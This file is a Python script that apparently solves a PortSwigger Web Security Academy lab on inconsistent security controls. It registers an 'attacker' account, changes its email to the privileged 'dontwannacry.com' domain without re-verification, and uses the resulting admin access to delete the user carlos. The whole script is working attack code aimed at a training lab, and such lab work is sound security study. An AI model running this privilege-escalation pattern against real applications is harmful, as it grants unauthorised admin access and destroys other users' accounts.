#######################################################################################
#
# Author: Ahmed Elqalaawy (@elqal3awii)
#
# Date: 25/10/2023
#
# Lab: Inconsistent security controls
#
# Steps: 1. Fetch the register page
#        2. Extract the csrf token and session cookie to register a new account
#        3. Register a new account as attacker
#        4. Fetch the email client
#        5. Extract the link of account registration
#        6. Complete the account registration by following the link
#        7. Fetch the login page
#        8. Extract the csrf token and session cookie to login
#        9. Login as attacker
#        10. Fetch attacker's profile
#        11. Extract the csrf token needed for email update
#        12. Update the email to attacker@dontwannacry.com
#        13. Delete carlos from the admin panel
#
#######################################################################################


###########
# imports
###########
import requests
import re
from colorama import Fore


###########
# Main
###########

# change this to your lab URL
url = "https://0a9000c704fa8040824ef7af009e00b8.web-security-academy.net"

# change this to your exploit domain
exploit_domain = "exploit-0a1d00f8041880908292f67201f10036.exploit-server.net"

try:  
    # fetch register page
    register_page = requests.get(f"{url}/register")

except:
    print(Fore.RED + "[!] Failed to fetch register page through exception")
    exit(1) 

print(Fore.WHITE + "⦗1⦘ Fetching the register page.. " + Fore.GREEN + "OK")

# get session cookie
session = register_page.cookies.get("session")

# extract the csrf token
csrf = re.findall("csrf.+value=\"(.+)\"", register_page.text)[0]

print(Fore.WHITE + "⦗2⦘ Extracting the csrf token and session cookie to register a new account.. " + Fore.GREEN + "OK")

# the username of the new account
# you can change this to what you want
username = "attacker"

# the username of the new account
# you can change this to what you want
password = "hacking"

# the email addresss of the attacker
attacker_email = f"attacker@{exploit_domain}"

# set session cookie
cookies = {
    "session": session
}

# data to send via POST
data = {
    "username": username,
    "password": password,
    "csrf": csrf,
    "email": attacker_email,
}

try:    
    # register a new account
    requests.post(f"{url}/register", data, cookies=cookies)
    
except:
    print(Fore.RED + "[!] Failed to register a new account through exception")
    exit(1)

print(Fore.WHITE + "⦗3⦘ Registering a new account as " + Fore.YELLOW + username + Fore.WHITE + ".. " + Fore.GREEN + "OK")

try:    
    # fetch the email client
    email_client = requests.get(f"https://{exploit_domain}/email")
    
except:
    print(Fore.RED + "[!] Failed to fetch the email client through exception")
    exit(1)

print(Fore.WHITE + "⦗4⦘ Fetching the email client.. " + Fore.GREEN + "OK")

# extract the link of account registration
regisration_link = re.findall(">(https.*)</a>", email_client.text)[0]

print(Fore.WHITE + "⦗5⦘ Extracting the link of account registration.. " + Fore.GREEN + "OK")

try:  
    # complete the account registration
    requests.get(regisration_link)

except:
    print(Fore.RED + "[!] Failed to complete the account registration through exception")
    exit(1) 

print(Fore.WHITE + "⦗6⦘ Completing the account registration by following the link.. " + Fore.GREEN + "OK")

try:  
    # fetch the login page
    login_page = requests.get(f"{url}/login")

except:
    print(Fore.RED + "[!] Failed to fetch the login page through exception")
    exit(1) 

print(Fore.WHITE + "⦗7⦘ Fetching the login page.. " + Fore.GREEN + "OK")

# get session cookie
session = login_page.cookies.get("session")

# extract the csrf token
csrf = re.findall("csrf.+value=\"(.+)\"", login_page.text)[0]

print(Fore.WHITE + "⦗8⦘ Extracting the csrf token and session cookie to login.. " + Fore.GREEN + "OK")

# set credentials
data = {
    "username": username,
    "password": password,
    "csrf": csrf
}

# set session cookie
cookies = {
    "session": session
}

try:    
    # login to the new account
    login = requests.post(f"{url}/login", data, cookies=cookies, allow_redirects=False)
    
except:
    print(Fore.RED + "[!] Failed to login to the new account through exception")
    exit(1)

print(Fore.WHITE + "⦗9⦘ Logging in as " + Fore.YELLOW + username + Fore.WHITE + ".. " + Fore.GREEN + "OK")

# get session cookie
session = login.cookies.get("session")

# set session cookie
cookies = {
    "session": session
}

try:    
    # fetch the profile page
    profile = requests.get(f"{url}/my-account", cookies=cookies)
    
except:
    print(Fore.RED + "[!] Failed to fetch the profile page through exception")
    exit(1)

print(Fore.WHITE + "⦗10⦘ Fetching " + Fore.YELLOW + username + Fore.WHITE + "'s profile.. " + Fore.GREEN + "OK")

# extract the csrf token
csrf = re.findall("csrf.+value=\"(.+)\"", profile.text)[0]

print(Fore.WHITE + "⦗11⦘ Extracting the csrf token needed for email update.. " + Fore.GREEN + "OK")

# the new email
new_email = f"{username}@dontwannacry.com"

# data to send via POST
data = {
    "email": new_email,
    "csrf": csrf
}

# set session cookie
cookies = {
    "session": session
}

try:    
    # update the email
    requests.post(f"{url}/my-account/change-email", data, cookies=cookies)
    
except:
    print(Fore.RED + "[!] Failed to update the email through exception")
    exit(1)

print(Fore.WHITE + "⦗12⦘ Updating the email to " + Fore.YELLOW + new_email + Fore.WHITE + ".. " + Fore.GREEN + "OK")

try:    
    # delete carlos from the admin panel
    requests.get(f"{url}/admin/delete?username=carlos", cookies=cookies)
    
except:
    print(Fore.RED + "[!] Failed to delete carlos from the admin panel through exception")
    exit(1)

print(Fore.WHITE + "⦗13⦘ Deleting carlos from the admin panel.. " + Fore.GREEN + "OK")
print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")
